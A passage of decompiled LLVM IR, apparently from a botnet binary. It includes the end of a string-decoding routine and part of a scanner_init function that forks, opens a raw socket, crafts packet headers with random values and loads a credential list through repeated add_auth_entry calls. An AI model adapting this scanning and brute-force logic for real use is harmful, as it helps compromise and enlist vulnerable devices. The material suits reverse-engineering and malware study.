  %v9_ebe0 = load i32, i32* @r6, align 4
  %v12_ebe0 = load i32, i32* @r7, align 4
  %v15_ebe0 = load i32, i32* @r8, align 4
  %v18_ebe0 = load i32, i32* @sb, align 4
  %v21_ebe0 = load i32, i32* @sl, align 4
  %v24_ebe0 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_2247c.144 to i32), i32* @fp, align 4
  %v2_ebe8 = load i32, i32* @global_var_2247c.144, align 4
  store i32 ptrtoint (i32* @global_var_224a8.146 to i32), i32* @sl, align 4
  %v1_ebf4 = add i32 %v2_ebe8, 1
  store i32 %v1_ebf4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_ec00 = load i32, i32* @global_var_224a8.146, align 4
  store i32 %v2_ec00, i32* %r0.global-to-local, align 4
  %v3_ec04 = mul i32 %v1_ebf4, 16
  store i32 %v3_ec04, i32* %r1.global-to-local, align 4
  %v4_ec0c = inttoptr i32 %v2_ec00 to i32*
  %v5_ec0c = call i32 @realloc(i32* %v4_ec0c, i32 %v3_ec04, i32 %arg3, i32 %v1_ebf4)
  %v2_ec10 = load i32, i32* @global_var_2247c.144, align 4
  store i32 %v2_ec10, i32* %r2.global-to-local, align 4
  store i32 %v5_ec0c, i32* @r8, align 4
  %v0_ec18 = load i32, i32* @r5, align 4
  store i32 %v0_ec18, i32* %r0.global-to-local, align 4
  %v1_ec20 = load i32, i32* @sl, align 4
  %v2_ec20 = inttoptr i32 %v1_ec20 to i32*
  store i32 %v5_ec0c, i32* %v2_ec20, align 4
  %v1_ec24 = inttoptr i32 %v0_ec18 to i8*
  %v2_ec24 = call i32 @util_strlen(i8* %v1_ec24)
  %sext = mul i32 %v2_ec24, 16777216
  %v1_ec28 = sdiv i32 %sext, 16777216
  %v2_ec28 = add nsw i32 %v1_ec28, 1
  store i32 %v2_ec28, i32* @r4, align 4
  store i32 %v1_ec28, i32* @r7, align 4
  store i32 %v2_ec28, i32* @r0, align 4
  %v0_ec34 = call i32 @malloc()
  store i32 %v0_ec34, i32* %r0.global-to-local, align 4
  %v0_ec38 = load i32, i32* @r5, align 4
  store i32 %v0_ec38, i32* %r1.global-to-local, align 4
  %v0_ec3c = load i32, i32* @r4, align 4
  store i32 %v0_ec3c, i32* %r2.global-to-local, align 4
  store i32 %v0_ec34, i32* %r6.global-to-local, align 4
  %v3_ec44 = call i32 @util_memcpy(i32 %v0_ec34, i32 %v0_ec38, i32 %v0_ec3c)
  store i32 %v3_ec44, i32* %r0.global-to-local, align 4
  %v0_ec48 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_ec48, 1
  %extract.t6 = trunc i32 %v0_ec48 to i8
  br i1 %tmp22, label %dec_label_pc_ec6c, label %dec_label_pc_ec50

dec_label_pc_ec50:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec54

dec_label_pc_ec54:                                ; preds = %dec_label_pc_ec54, %dec_label_pc_ec50
  %v2_ec5c = phi i32 [ %v1_ec60, %dec_label_pc_ec54 ], [ 0, %dec_label_pc_ec50 ]
  %v1_ec54 = load i32, i32* %r6.global-to-local, align 4
  %v2_ec54 = add i32 %v1_ec54, %v2_ec5c
  %v3_ec54 = inttoptr i32 %v2_ec54 to i8*
  %v4_ec54 = load i8, i8* %v3_ec54, align 1
  %v6_ec54 = zext i8 %v4_ec54 to i32
  %v1_ec58 = xor i32 %v6_ec54, 84
  store i32 %v1_ec58, i32* %r3.global-to-local, align 4
  %v1_ec5c = trunc i32 %v1_ec58 to i8
  store i8 %v1_ec5c, i8* %v3_ec54, align 1
  %v0_ec60 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec60 = add i32 %v0_ec60, 1
  store i32 %v1_ec60, i32* %r2.global-to-local, align 4
  %v1_ec64 = load i32, i32* @r7, align 4
  %v9_ec64 = icmp eq i32 %v1_ec60, %v1_ec64
  br i1 %v9_ec64, label %dec_label_pc_ec6c.loopexit, label %dec_label_pc_ec54

dec_label_pc_ec6c.loopexit:                       ; preds = %dec_label_pc_ec54
  %extract.t = trunc i32 %v1_ec60 to i8
  br label %dec_label_pc_ec6c

dec_label_pc_ec6c:                                ; preds = %dec_label_pc_ec6c.loopexit, %entry
  %v0_ec7c.off0 = phi i8 [ %extract.t, %dec_label_pc_ec6c.loopexit ], [ %extract.t6, %entry ]
  %v2_ec6c = load i32, i32* @global_var_2247c.144, align 4
  %v2_ec70 = load i32, i32* @global_var_224a8.146, align 4
  %v3_ec74 = mul i32 %v2_ec6c, 16
  store i32 %v3_ec74, i32* @sb, align 4
  %v2_ec78 = add i32 %v2_ec70, %v3_ec74
  store i32 %v2_ec78, i32* %r2.global-to-local, align 4
  %v3_ec7c = add i32 %v2_ec78, 12
  %v4_ec7c = inttoptr i32 %v3_ec7c to i8*
  store i8 %v0_ec7c.off0, i8* %v4_ec7c, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_ec10, i32* %r3.global-to-local, align 4
  %v0_ec88 = load i32, i32* %r6.global-to-local, align 4
  %v1_ec88 = load i32, i32* @r8, align 4
  %v5_ec88 = mul i32 %v2_ec10, 16
  %v6_ec88 = add i32 %v1_ec88, %v5_ec88
  %v7_ec88 = inttoptr i32 %v6_ec88 to i32*
  store i32 %v0_ec88, i32* %v7_ec88, align 4
  %v2_ec8c = load i32, i32* @global_var_224a8.146, align 4
  store i32 %v2_ec8c, i32* @r7, align 4
  %v1_ec90 = inttoptr i32 %arg2 to i8*
  %v2_ec90 = call i32 @util_strlen(i8* %v1_ec90)
  %sext1 = mul i32 %v2_ec90, 16777216
  %v1_ec94 = sdiv i32 %sext1, 16777216
  %v2_ec94 = add nsw i32 %v1_ec94, 1
  store i32 %v2_ec94, i32* @r4, align 4
  store i32 %v1_ec94, i32* @r6, align 4
  store i32 %v2_ec94, i32* @r0, align 4
  %v0_eca0 = call i32 @malloc()
  store i32 %v0_eca0, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_eca8 = load i32, i32* @r4, align 4
  store i32 %v0_eca8, i32* %r2.global-to-local, align 4
  store i32 %v0_eca0, i32* %r5.global-to-local, align 4
  %v3_ecb0 = call i32 @util_memcpy(i32 %v0_eca0, i32 %arg2, i32 %v0_eca8)
  store i32 %v3_ecb0, i32* %r0.global-to-local, align 4
  %v0_ecb4 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_ecb4, 1
  %extract.t8 = trunc i32 %v0_ecb4 to i8
  br i1 %tmp23, label %dec_label_pc_ecd8, label %dec_label_pc_ecbc

dec_label_pc_ecbc:                                ; preds = %dec_label_pc_ec6c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ecc0

dec_label_pc_ecc0:                                ; preds = %dec_label_pc_ecc0, %dec_label_pc_ecbc
  %v2_ecc8 = phi i32 [ %v1_eccc, %dec_label_pc_ecc0 ], [ 0, %dec_label_pc_ecbc ]
  %v1_ecc0 = load i32, i32* %r5.global-to-local, align 4
  %v2_ecc0 = add i32 %v1_ecc0, %v2_ecc8
  %v3_ecc0 = inttoptr i32 %v2_ecc0 to i8*
  %v4_ecc0 = load i8, i8* %v3_ecc0, align 1
  %v6_ecc0 = zext i8 %v4_ecc0 to i32
  %v1_ecc4 = xor i32 %v6_ecc0, 84
  store i32 %v1_ecc4, i32* %r3.global-to-local, align 4
  %v1_ecc8 = trunc i32 %v1_ecc4 to i8
  store i8 %v1_ecc8, i8* %v3_ecc0, align 1
  %v0_eccc = load i32, i32* %r2.global-to-local, align 4
  %v1_eccc = add i32 %v0_eccc, 1
  store i32 %v1_eccc, i32* %r2.global-to-local, align 4
  %v1_ecd0 = load i32, i32* @r6, align 4
  %v9_ecd0 = icmp eq i32 %v1_eccc, %v1_ecd0
  br i1 %v9_ecd0, label %dec_label_pc_ecd8.loopexit, label %dec_label_pc_ecc0

dec_label_pc_ecd8.loopexit:                       ; preds = %dec_label_pc_ecc0
  %extract.t7 = trunc i32 %v1_eccc to i8
  br label %dec_label_pc_ecd8

dec_label_pc_ecd8:                                ; preds = %dec_label_pc_ecd8.loopexit, %dec_label_pc_ec6c
  %v0_ece8.off0 = phi i8 [ %extract.t7, %dec_label_pc_ecd8.loopexit ], [ %extract.t8, %dec_label_pc_ec6c ]
  %v2_ecd8 = load i32, i32* @global_var_2247c.144, align 4
  store i32 %v2_ecd8, i32* %r0.global-to-local, align 4
  %v2_ecdc = load i32, i32* @global_var_224a8.146, align 4
  %v3_ece0 = mul i32 %v2_ecd8, 16
  store i32 %v3_ece0, i32* %r1.global-to-local, align 4
  %v2_ece4 = or i32 %v3_ece0, 13
  %v3_ece8 = add i32 %v2_ece4, %v2_ecdc
  %v4_ece8 = inttoptr i32 %v3_ece8 to i8*
  store i8 %v0_ece8.off0, i8* %v4_ece8, align 1
  store i32 ptrtoint (i16** @global_var_224ac.148 to i32), i32* %r4.global-to-local, align 4
  %v2_ecf4 = load i16, i16* bitcast (i16** @global_var_224ac.148 to i16*), align 4
  %v3_ecf4 = zext i16 %v2_ecf4 to i32
  store i32 %v3_ecf4, i32* %lr.global-to-local, align 4
  %v2_ecfc = load i32, i32* @global_var_224a8.146, align 4
  store i32 %v2_ecfc, i32* %r2.global-to-local, align 4
  %v0_ed04 = load i32, i32* %r1.global-to-local, align 4
  %v2_ed04 = add i32 %v0_ed04, %v2_ecfc
  store i32 %v2_ed04, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_224ac.148 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_ed0c = load i32, i32* @sb, align 4
  %v1_ed0c = load i32, i32* @r7, align 4
  %v2_ed0c = add i32 %v1_ed0c, %v0_ed0c
  store i32 %v2_ed0c, i32* %ip.global-to-local, align 4
  %v0_ed10 = load i32, i32* %r0.global-to-local, align 4
  %v1_ed10 = add i32 %v0_ed10, 1
  store i32 %v1_ed10, i32* %r0.global-to-local, align 4
  %v3_ed14 = add i32 %v2_ed04, 10
  %v4_ed14 = inttoptr i32 %v3_ed14 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_224ac.148 to i32), i32 16), i32 16) to i16), i16* %v4_ed14, align 2
  %v0_ed18 = load i32, i32* %lr.global-to-local, align 4
  %v1_ed18 = trunc i32 %v0_ed18 to i16
  %v2_ed18 = load i32, i32* %r1.global-to-local, align 4
  %v3_ed18 = add i32 %v2_ed18, 8
  %v4_ed18 = inttoptr i32 %v3_ed18 to i16*
  store i16 %v1_ed18, i16* %v4_ed18, align 2
  %v0_ed1c = load i32, i32* %r5.global-to-local, align 4
  %v1_ed1c = load i32, i32* %ip.global-to-local, align 4
  %v2_ed1c = add i32 %v1_ed1c, 4
  %v3_ed1c = inttoptr i32 %v2_ed1c to i32*
  store i32 %v0_ed1c, i32* %v3_ed1c, align 4
  %v1_ed20 = load i32, i32* @fp, align 4
  %v2_ed20 = inttoptr i32 %v1_ed20 to i32*
  store i32 %v1_ed10, i32* %v2_ed20, align 4
  %v0_ed24 = load i32, i32* %r3.global-to-local, align 4
  %v1_ed24 = trunc i32 %v0_ed24 to i16
  %v2_ed24 = load i32, i32* %r4.global-to-local, align 4
  %v3_ed24 = inttoptr i32 %v2_ed24 to i16*
  store i16 %v1_ed24, i16* %v3_ed24, align 2
  store i32 %v3_ebe0, i32* @r4, align 4
  store i32 %v6_ebe0, i32* @r5, align 4
  store i32 %v9_ebe0, i32* @r6, align 4
  store i32 %v12_ebe0, i32* @r7, align 4
  store i32 %v15_ebe0, i32* @r8, align 4
  store i32 %v18_ebe0, i32* @sb, align 4
  store i32 %v21_ebe0, i32* @sl, align 4
  store i32 %v24_ebe0, i32* @fp, align 4
  ret i32 %v1_ed10

; uselistorder directives
  uselistorder i32 %v3_ece0, { 1, 0 }
  uselistorder i32 %v1_eccc, { 0, 2, 3, 1 }
  uselistorder i32 %v0_eca0, { 1, 0, 2 }
  uselistorder i32 %v3_ec74, { 1, 0 }
  uselistorder i32 %v1_ec60, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ec34, { 1, 0, 2 }
  uselistorder i32 %v2_ec10, { 1, 0, 2 }
  uselistorder i32 %v3_ec04, { 1, 0 }
  uselistorder i32 %v1_ebf4, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 5, 6, 0, 1, 2, 3, 4, 27, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp335 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_ed40 = load i32, i32* @r5, align 4
  %v18_ed40 = load i32, i32* @sb, align 4
  %v21_ed40 = load i32, i32* @sl, align 4
  %v24_ed40 = load i32, i32* @fp, align 4
  %v0_ed4c = call i32 @__libc_fork()
  store i32 %v0_ed4c, i32* %r0.global-to-local, align 4
  %v7_ed50 = icmp eq i32 %v0_ed4c, -1
  %. = zext i1 %v7_ed50 to i32
  %tmp370 = icmp slt i32 %v0_ed4c, 1
  %storemerge329 = select i1 %tmp370, i32 %., i32 1
  store i32 %storemerge329, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24f9c.140 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed6c = icmp eq i32 %storemerge329, 0
  store i1 %v2_ed6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_ed4c, i32* @global_var_24f9c.140, align 4
  br i1 %v2_ed6c, label %dec_label_pc_ed88, label %dec_label_pc_ed78

dec_label_pc_ed78:                                ; preds = %entry
  store i32 %v6_ed40, i32* @r5, align 4
  store i32 %v18_ed40, i32* @sb, align 4
  store i32 %v21_ed40, i32* @sl, align 4
  store i32 %v24_ed40, i32* @fp, align 4
  ret i32 %v0_ed4c

dec_label_pc_ed88:                                ; preds = %entry
  %v0_ed88 = call i32 @util_local_addr()
  store i32 %v0_ed88, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24f78.59 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_ed88, i32* @global_var_24f78.59, align 4
  %v1_ed94 = call i32 @rand_init(i32 %v0_ed88)
  %v0_ed98 = load i32, i32* @r4, align 4
  store i32 %v0_ed98, i32* %r0.global-to-local, align 4
  %v1_ed9c = inttoptr i32 %v0_ed98 to i32*
  %v2_ed9c = call i32 @__GI_time(i32* %v1_ed9c)
  store i32 ptrtoint (i32* @global_var_224b0.142 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_ed9c, i32* @global_var_224b0.142, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_edb0 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_24f94.153 to i32), i32* %r3.global-to-local, align 4
  %v0_edb8 = load i32, i32* @r4, align 4
  store i32 %v0_edb8, i32* %stack_var_-52, align 4
  store i32 %v2_edb0, i32* @global_var_24f94.153, align 4
  store i32 %v0_edb8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_edc4

dec_label_pc_edc4:                                ; preds = %dec_label_pc_edc4.dec_label_pc_edc4_crit_edge, %dec_label_pc_ed88
  %v2_edd0 = phi i32 [ %v2_edd0.pre, %dec_label_pc_edc4.dec_label_pc_edc4_crit_edge ], [ %v2_edb0, %dec_label_pc_ed88 ]
  %v0_edd8 = phi i32 [ %v0_ee08, %dec_label_pc_edc4.dec_label_pc_edc4_crit_edge ], [ %v0_edb8, %dec_label_pc_ed88 ]
  %v3_edcc = mul i32 %v0_edd8, 256
  store i32 %v3_edcc, i32* %ip.global-to-local, align 4
  store i32 %v2_edd0, i32* @lr, align 4
  %v2_ede0 = mul i32 %v0_edd8, 288
  %v1_ede8 = add i32 %v0_edd8, 1
  store i32 %v1_ede8, i32* %r0.global-to-local, align 4
  %v2_edec = add i32 %v2_ede0, %v2_edd0
  store i32 %v2_edec, i32* %r2.global-to-local, align 4
  store i32 %v2_edec, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_ee00 = add i32 %v2_edec, 4
  %v3_ee00 = inttoptr i32 %v2_ee00 to i32*
  store i32 -1, i32* %v3_ee00, align 4
  %v0_ee04 = load i32, i32* @r5, align 4
  %v1_ee04 = load i32, i32* %r1.global-to-local, align 4
  %v2_ee04 = add i32 %v1_ee04, 12
  %v3_ee04 = inttoptr i32 %v2_ee04 to i32*
  store i32 %v0_ee04, i32* %v3_ee04, align 4
  %v0_ee08 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ee08, i32* %stack_var_-52, align 4
  %v7_ee0c = icmp sgt i32 %v1_ede8, 255
  br i1 %v7_ee0c, label %dec_label_pc_ee10, label %dec_label_pc_edc4.dec_label_pc_edc4_crit_edge

dec_label_pc_edc4.dec_label_pc_edc4_crit_edge:    ; preds = %dec_label_pc_edc4
  %v2_edd0.pre = load i32, i32* @global_var_24f94.153, align 4
  br label %dec_label_pc_edc4

dec_label_pc_ee10:                                ; preds = %dec_label_pc_edc4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_ee1c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_ee1c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24f98.155 to i32), i32* %r2.global-to-local, align 4
  %v2_ee24 = icmp eq i32 %v3_ee1c, -1
  store i1 %v2_ee24, i1* %cpsr_c.global-to-local, align 1
  %v7_ee24 = icmp eq i32 %v3_ee1c, -1
  store i1 %v7_ee24, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ee1c, i32* @r4, align 4
  store i32 %v3_ee1c, i32* @global_var_24f98.155, align 4
  br i1 %v7_ee24, label %dec_label_pc_104c0, label %dec_label_pc_ee34

dec_label_pc_ee34:                                ; preds = %dec_label_pc_ee10
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_ee38 = load i32, i32* @r5, align 4
  store i32 %v0_ee38, i32* @r2, align 4
  %v2_ee3c = call i32 @__libc_fcntl(i32 %v3_ee1c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_ee44 = or i32 %v2_ee3c, 2048
  store i32 %v1_ee44, i32* @r2, align 4
  %v0_ee48 = load i32, i32* @r4, align 4
  store i32 %v0_ee48, i32* %r0.global-to-local, align 4
  %v2_ee4c = call i32 @__libc_fcntl(i32 %v0_ee48, i32 4)
  %v2_ee54 = load i32, i32* @global_var_24f98.155, align 4
  store i32 %v2_ee54, i32* %r0.global-to-local, align 4
  %v2_ee58 = ptrtoint i32* %stack_var_-56 to i32
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_ee60 = load i32, i32* @r5, align 4
  store i32 %v0_ee60, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_ee68 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_ee68, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_ee78 = call i32 @__GI_setsockopt(i32 %v2_ee54, i32 %v0_ee60, i32 3, i32 %v2_ee68, i32 4)
  store i32 %v5_ee78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee7c = icmp eq i32 %v5_ee78, 0
  store i1 %v2_ee7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee7c, label %dec_label_pc_ee84, label %dec_label_pc_104b4

dec_label_pc_ee84:                                ; preds = %dec_label_pc_ee34, %dec_label_pc_ee84
  %v0_ee84 = call i32 @rand_next()
  %v3_ee88 = mul i32 %v0_ee84, 65536
  store i32 %v3_ee88, i32* %r0.global-to-local, align 4
  %v1_ee90 = mul i32 %v0_ee84, 256
  %v3_ee94 = and i32 %v1_ee90, 65280
  %tmp373 = udiv i32 %v0_ee84, 256
  %v4_ee98 = urem i32 %tmp373, 256
  %v5_ee98 = or i32 %v4_ee98, %v3_ee94
  store i32 %v5_ee98, i32* %r3.global-to-local, align 4
  %v2_ee9c = icmp ugt i32 %v5_ee98, 1023
  store i1 %v2_ee9c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee9c = icmp eq i32 %v5_ee98, 1024
  store i1 %v7_ee9c, i1* %cpsr_z.global-to-local, align 1
  %v3_eea4 = icmp ult i32 %v5_ee98, 1022
  br i1 %v3_eea4, label %dec_label_pc_ee84, label %dec_label_pc_eea8

dec_label_pc_eea8:                                ; preds = %dec_label_pc_ee84
  %v5_eea0.le = trunc i32 %v0_ee84 to i16
  store i32 ptrtoint (i8** @global_var_22480.157 to i32), i32* %r0.global-to-local, align 4
  %v2_eeac = load i8, i8* bitcast (i8** @global_var_22480.157 to i8*), align 4
  %v3_eeac = zext i8 %v2_eeac to i32
  %v1_eeb0 = and i32 %v3_eeac, 240
  %v1_eeb4 = or i32 %v1_eeb0, 5
  store i32 %v1_eeb4, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_22480.157 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_22482.158 to i16*), align 4
  %v0_eed4 = call i32 @rand_next()
  %v1_eed4 = trunc i32 %v0_eed4 to i16
  %v3_eedc = load i8, i8* @global_var_224a0.161, align 1
  store i32 ptrtoint (i16* @global_var_22494.160 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_22480.157 to i32), i32* %ip.global-to-local, align 4
  %v1_eeec = urem i8 %v3_eedc, 16
  store i16 %v1_eed4, i16* bitcast (i32* @global_var_22484.162 to i16*), align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v1_eefc = or i8 %v1_eeec, 80
  store i8 64, i8* bitcast (i32* @global_var_22488.163 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_22489.164 to i8*), align 4
  store i8 %v1_eefc, i8* @global_var_224a0.161, align 1
  %v4_ef0c = sext i16 %v5_eea0.le to i32
  store i32 %v4_ef0c, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_22496.165, align 2
  store i16 %v5_eea0.le, i16* @global_var_22494.160, align 2
  %v0_ef1c = call i32 @rand_next()
  %v1_ef1c = trunc i32 %v0_ef1c to i16
  %v3_ef24 = load i8, i8* @global_var_224a1.166, align 1
  %v4_ef24 = zext i8 %v3_ef24 to i32
  store i32 ptrtoint (i16* @global_var_22494.160 to i32), i32* %ip.global-to-local, align 4
  %v1_ef2c = or i32 %v4_ef24, 2
  store i32 %v1_ef2c, i32* %r3.global-to-local, align 4
  store i16 %v1_ef1c, i16* bitcast (i32* @global_var_224a2.167 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_19adc.169 to i32), i32* %r1.global-to-local, align 4
  %v1_ef38 = trunc i32 %v1_ef2c to i8
  store i8 %v1_ef38, i8* @global_var_224a1.166, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_ef44 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32 ptrtoint (i32* @global_var_19adc.169 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19ae0.173 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_ef54 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32 ptrtoint ([5 x i8]* @global_var_19ae0.173 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19ae8.175 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_ef64 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32 ptrtoint ([9 x i8]* @global_var_19ae8.175 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_19af4.177 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19adc.169 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_ef74 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19af4.177 to i32), i32 ptrtoint (i32* @global_var_19adc.169 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19afc.179 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_ef84 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32 ptrtoint ([9 x i8]* @global_var_19afc.179 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_19b08.181 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19b08.181 to i32), i32* %r1.global-to-local, align 4
  %v5_ef94 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_19b08.181 to i32), i32 ptrtoint ([6 x i8]* @global_var_19b08.181 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19b10.183 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_efa4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32 ptrtoint ([6 x i8]* @global_var_19b10.183 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_19b18.185 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19b18.185 to i32), i32* %r1.global-to-local, align 4
  %v5_efb4 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19b18.185 to i32), i32 ptrtoint ([8 x i8]* @global_var_19b18.185 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19af4.177 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_efc4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32 ptrtoint ([8 x i8]* @global_var_19af4.177 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19b20.187 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_efd4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32 ptrtoint (i32* @global_var_19b20.187 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19b30.189 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_efe4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), i32 ptrtoint ([6 x i8]* @global_var_19b30.189 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_19b38.191 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19b38.191 to i32), i32* %r1.global-to-local, align 4
